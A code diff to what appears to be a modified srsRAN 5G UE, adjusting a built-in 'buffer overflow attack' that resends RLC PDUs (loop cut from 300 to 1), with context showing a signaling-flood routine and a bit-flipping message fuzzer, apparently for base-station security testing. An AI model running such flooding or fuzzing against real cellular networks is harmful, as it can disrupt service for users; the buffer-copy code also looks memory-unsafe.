@@ -684,7 +684,7 @@ void rrc_nr::send_ul_ccch_msg(const asn1::rrc_nr::ul_ccch_msg_s& msg)
     return;
   }
 
-  if (args.rlc_buffer_overflow_attack == "rrcSetupComplete" ){
+  if (args.rlc_buffer_overflow_attack == 1 ){
     rlc->write_sdu(lcid, std::move(rlc_buffer_overflow_attack_ccch(lcid, std::move(pdu), msg_name)));
     return;
   }
@@ -707,11 +707,14 @@ srsran::unique_byte_buffer_t rrc_nr::signal_flood_ccch(uint32_t lcid, srsran::un
 }
 
 
-srsran::unique_byte_buffer_t rrc_nr::rlc_buffer_overflow_attack_ccch(uint32_t lcid, srsran::unique_byte_buffer_t pdu, std::string msg_name){
-  for (uint16_t i = 0; i < 300; i++)
+srsran::unique_byte_buffer_t rrc_nr::rlc_buffer_overflow_attack_ccch(uint32_t lcid, srsran::unique_byte_buffer_t pdu, std::string msg_name)
+{
+ 
+  for (uint16_t i = 0; i < 1; i++)
   {
     srsran::unique_byte_buffer_t new_buffer(pdu.get());
     std::cout << "Buffer Overflow Attack: " << std::endl
+                 << "\tMsg length(bytes): " << pdu->N_bytes << std::endl
                 << "\tRLC pdu length: " << rlc_pdu_len<< std::endl
                 << "MAC Buffer remaining space: " << mac_buff_rem_space << std::endl;
     rlc->write_sdu(lcid, std::move(new_buffer));
@@ -781,6 +784,8 @@ srsran::unique_byte_buffer_t rrc_nr::fuzz_dcch_msg(srsran::unique_byte_buffer_t 
         uint8_t bit_to_flip = std::rand() % 8;
         pdu->msg[byte_to_flip] ^= (1 << bit_to_flip); // Flip a random bit in the buffer
   }
+
+
   return std::move(pdu);
 }
 
